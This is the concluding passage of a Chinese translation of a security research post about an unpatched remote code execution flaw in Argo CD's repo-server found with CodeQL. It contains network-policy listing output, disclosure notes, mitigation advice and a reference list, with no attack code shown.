$ kubectl get networkpolicy -A
NAMESPACE   NAME                                              POD-SELECTOR                                              AGE
argocd      argocd-application-controller-network-policy      app.kubernetes.io/name=argocd-application-controller      29d
argocd      argocd-applicationset-controller-network-policy   app.kubernetes.io/name=argocd-applicationset-controller   29d
argocd      argocd-dex-server-network-policy                  app.kubernetes.io/name=argocd-dex-server                  29d
argocd      argocd-notifications-controller-network-policy    app.kubernetes.io/name=argocd-notifications-controller    29d
argocd      argocd-redis-network-policy                       app.kubernetes.io/name=argocd-redis                       29d
argocd      argocd-repo-server-network-policy                 app.kubernetes.io/name=argocd-repo-server                 29d
argocd      argocd-server-network-policy                      app.kubernetes.io/name=argocd-server                      29d
```  
## 八、结论  
  
本文展示了我们如何使用 CodeQL 在 Argo CD 的 repo-server  
 组件中识别出一个任意代码执行漏洞，该漏洞可能最终导致整个集群被入侵。尽管 CodeQL 最初并未识别出该漏洞，但我们创建了专门针对 Argo CD 的模型包。CodeQL 是一个强大的工具，尽管偶尔会产生误报，但通过手动分析建议的路径以识别潜在的绕过或其他漏洞，它可以产生有价值的见解。有关其他 Argo CD 漏洞的更多信息，请参考 Ledger 的  
这篇文章[20]  
。  
  
我们于 2025 年 1 月负责任地向 Argo CD 维护者披露了这些漏洞。尽管我们不断努力建立沟通并协调修复，包括通过 GitHub 和电子邮件进行了多次跟进，但该漏洞仍未得到修补。我们决定发布此文章以提醒社区注意风险，以便用户能够保护自己的环境。我们仍然希望 Argo CD 团队能尽快提供修补程序。  
  
在官方修复可用之前，应用严格的网络策略能有效防止利用。为了让防御者有足够的时间应用这些策略，我们暂时推迟了利用工具 argo-cdown  
 的发布。它将于稍后日期在我们的 GitHub 上提供，以便管理员可以安全地验证其部署是否存在漏洞。  
  
如果您想了解更多，可以报名参加我们的云安全培训，其中包括一个包含 Argo CD 实例的 Kubernetes 实验环境，以及其他资源。特别感谢   
@paulb[21]  
 和   
@dzeta[22]  
，两位云安全培训讲师，在此漏洞研究中提供的帮助。此外，我们最近推出了 Web 白盒安全培训，其中一部分内容解释了如何使用 CodeQL 结合真实世界示例来支持您的研究。  
#### 引用链接  
  
[1]  
 《Caught in the Octopus Trap: Unauthenticated RCE in Argo CD with CodeQL》: https://www.synacktiv.com/en/publications/caught-in-the-octopus-trap-unauthenticated-rce-in-argo-cd-with-codeql.html[2]  
 1: https://www.synacktiv.com/publications/hijacking-github-runners-to-compromise-the-organization[3]  
 2: https://www.synacktiv.com/publications/github-actions-exploitation-dependabot[4]  
 3: https://www.synacktiv.com/publications/cicd-secrets-extraction-tips-and-tricks[5]  
 4: https://www.synacktiv.com/publications/github-actions-exploitation-untrusted-input[6]  
 5: https://www.synacktiv.com/publications/azure-devops-build-agent-analysis[7]  
 调查: https://blog.argoproj.io/cncf-argo-cd-rollouts-2023-user-survey-results-514aa21c21df[8]  
 之前的一些工作: https://www.synacktiv.com/en/publications/finding-gadgets-like-its-2022[9]  
 `GitHubSecurityLab/CodeQL-Community-Packs`: https://github.com/GitHubSecurityLab/CodeQL-Community-Packs/[10]  
 `trailofbits/codeql-queries`: https://github.com/trailofbits/codeql-queries[11]  
 `githubsecuritylab/audit/attack-surface`: https://github.com/GitHubSecurityLab/CodeQL-Community-Packs/blob/main/go/src/audit/explore/RemoteFlowSources.ql[12]  
 CodeQL 强大的模型包功能: https://codeql.github.com/docs/codeql-language-guides/customizing-library-models-for-go/[13]  
 文档: https://argo-cd.readthedocs.io/en/stable/user-guide/kustomize/#kustomize-build-optionsparameters[14]  
 博客文章: https://cycode.com/blog/revealing-argo-cd-critical-vulnerability/[15]  
 文档: https://argo-cd.readthedocs.io/en/stable/operator-manual/high_availability/#high-availability[16]  
 仓库: https://github.com/hugo-syn/argocd-example-apps[17]  
 BadPods: https://github.com/BishopFox/badPods/blob/main/manifests/everything-allowed/deployment/everything-allowed-exec-deployment.yaml[18]  
 策略: https://github.com/argoproj/argo-cd/blob/e3bcc48bf2dc92c1f397dc28a333881106a8a653/manifests/base/repo-server/argocd-repo-server-network-policy.yaml[19]  
 并未应用: https://github.com/argoproj/argo-helm/blob/2685b861d2b2af4f5797522ec3cef8140c3d6049/charts/argo-cd/values.yaml#L112[20]  
 这篇文章: https://www.ledger.com/argo-cd-security-misconfiguration-adventures[21]  
 @paulb: https://bsky.app/profile/b-paul.bsky.social[22]  
 @dzeta: https://bsky.app/profile/dzetalol.bsky.social  
  
   
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/Kric7mM9eA5ATqNawYEiaHG70DIiaX4jlpTEvFTGHpT9Ro6MLIP1xaKzzK5ysibrqO9ROibvuLTGaGok0jLb2VBOJe0ttkXExuBtK89Z92z4TOVk/640?wx_fmt=gif&from=appmsg "")  
  
  
  
**交流群**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Kric7mM9eA5AFZSUHnom7E4u9gkK03LL1L4CmJib4zaTrVmZgxL7PHUOkkmicWSAwmvEE2jNxmBEoXmg3Y9DnXdoCbNu95p8hic9lNqNWXd6PgE/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
**知识库**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Kric7mM9eA5DLBLI1CLdbrGEYtic0nXBUWOzpLqdMPQ9pfX5ia1UfliaS50mBY5MmSUYia6hBGpdIvQ1BvSJrrjADp5HM6AKRmeHEfsado5YxZbM/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
  
